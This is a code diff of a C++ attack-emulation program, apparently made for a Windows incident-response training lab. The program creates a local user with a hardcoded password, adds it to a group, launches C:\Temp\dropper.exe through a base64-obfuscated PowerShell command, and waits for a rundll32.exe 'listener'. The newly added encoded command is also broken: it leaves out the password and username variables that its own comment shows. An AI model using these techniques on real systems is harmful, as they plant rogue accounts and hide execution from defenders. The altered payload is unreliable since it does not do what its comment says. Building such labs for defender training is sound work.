@@ -56,14 +56,18 @@ int wmain()
     // powershell.exe -Command $username = 'Raven'; $password = 'Password1!';
     // $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
     // $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
-    // Start-Process C:\\Temp\\dropper.exe -Credential $credential;
-    std::string cmdline = "powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBSAGEAdgBlAG4AJwA7ACAAJABwAGEAcwBzAHcAbwByAGQAIAA9ACAAJwBQAGEAcwBzAHcAbwByAGQAMQAhACcAOwAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHAAYQBzAHMAdwBvAHIAZAAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUAOwAgACQAYwByAGUAZABlAG4AdABpAGEAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJAB1AHMAZQByAG4AYQBtAGUALAAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAQwA6AFwAXABUAGUAbQBwAFwAXABkAHIAbwBwAHAAZQByAC4AZQB4AGUAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAOwA=";
+    // Start-Process C:\\Temp\\dropper.exe -Credential $credential -NoNewWindow;
+    std::string cmdline = "powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBSAGEAdgBlAG4AJwA7ACAAIAA9ACAAJwBQAGEAcwBzAHcAbwByAGQAMQAhACcAOwAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHAAYQBzAHMAdwBvAHIAZAAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUAOwAgACQAYwByAGUAZABlAG4AdABpAGEAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAALAAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAQwA6AFwAXABUAGUAbQBwAFwAXABkAHIAbwBwAHAAZQByAC4AZQB4AGUAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAIAAtAE4AbwBOAGUAdwBXAGkAbgBkAG8AdwA7AA==";
     
     MsgBoxStart();
 
     CreateProc("dropper", cmdline);
 
-    // TODO: pop message box saying completed and give activity timestamps
+    // wait for the standalone listener to spawn, signaling the end of execution
+    WaitForListener();
+
+    // pop message box saying completed and give activity timestamps
+    MsgBoxEnd();
 
     return 0;
 }
@@ -105,6 +109,8 @@ void CreateUser(std::wstring username, std::wstring password) {
         (LPBYTE)&user_info, // input buffer 
         &param_err); // parameter in error 
 
+    #pragma warning( push )
+    #pragma warning( disable : 4244) // loss of data wstring -> string
     switch (err)
     {
     case 0:
@@ -121,6 +127,7 @@ void CreateUser(std::wstring username, std::wstring password) {
         Log("[!] Error adding user " + std::string(username.begin(), username.end()) + " : " + std::to_string(err), componentName);
         break;
     }
+    #pragma warning( pop ) 
 
     // add user to group
     LOCALGROUP_MEMBERS_INFO_3 localgroup_members;
@@ -133,6 +140,8 @@ void CreateUser(std::wstring username, std::wstring password) {
         (LPBYTE)&localgroup_members,
         1);
 
+    #pragma warning( push )
+    #pragma warning( disable : 4244) // loss of data wstring -> string
     switch (err)
     {
     case 0:
@@ -146,13 +155,14 @@ void CreateUser(std::wstring username, std::wstring password) {
         Log("[!] Error adding user " + std::string(username.begin(), username.end()) + " to local group: " + std::to_string(err), componentName);
         break;
     }
+    #pragma warning( pop ) 
 }
 
 void MsgBoxStart() {
     std::time_t t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
     std::string ts = std::ctime(&t);
     ts.resize(ts.size() - 1);
-    ts = "Incident start timestamp (record this!):\n" + ts;
+    ts = "Incident START timestamp (record this!):\n" + ts;
     LPCSTR text = ts.c_str();
     LPCSTR caption = "Active Cyber Defense Windows IR Lab";
     MessageBoxA(
@@ -162,4 +172,55 @@ void MsgBoxStart() {
         MB_OK | MB_ICONINFORMATION | MB_TASKMODAL | MB_SETFOREGROUND | MB_TOPMOST
     );
 
+}
+
+void WaitForListener() {
+    DWORD target = 0;
+
+    while (target == 0) {
+        BOOL foundProc = FALSE;
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(PROCESSENTRY32W);
+
+        Log("[*] Finding listener process.", componentName);
+
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 1);
+        std::unique_ptr<void, decltype(&CloseHandle)> uphSnapshot(static_cast<void*>(hSnapshot), CloseHandle);
+        if (hSnapshot == INVALID_HANDLE_VALUE || !Process32FirstW(hSnapshot, &pe)) {
+            Log("[!] CreateToolhelp32Snapshot failed.", componentName);
+            return; // list of processes is invalid or empty
+        }
+
+        do {
+            std::wstring procName = pe.szExeFile;
+            if (procName.compare(L"rundll32.exe") == 0) {
+                target = pe.th32ProcessID;
+                foundProc = TRUE;
+            }
+        } while (Process32NextW(hSnapshot, &pe) && !foundProc);
+
+        if (target != 0) {
+            Log("[+] Found listener process.", componentName);
+        }
+        else {
+            Log("[!] Failed to find listener process.", componentName);
+        }
+
+        Sleep(10000);
+    }
+}
+
+void MsgBoxEnd() {
+    std::time_t t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+    std::string ts = std::ctime(&t);
+    ts.resize(ts.size() - 1);
+    ts = "Incident END timestamp (record this!):\n" + ts;
+    LPCSTR text = ts.c_str();
+    LPCSTR caption = "Active Cyber Defense Windows IR Lab";
+    MessageBoxA(
+        NULL,
+        text,
+        caption,
+        MB_OK | MB_ICONINFORMATION | MB_TASKMODAL | MB_SETFOREGROUND | MB_TOPMOST
+    );
 }
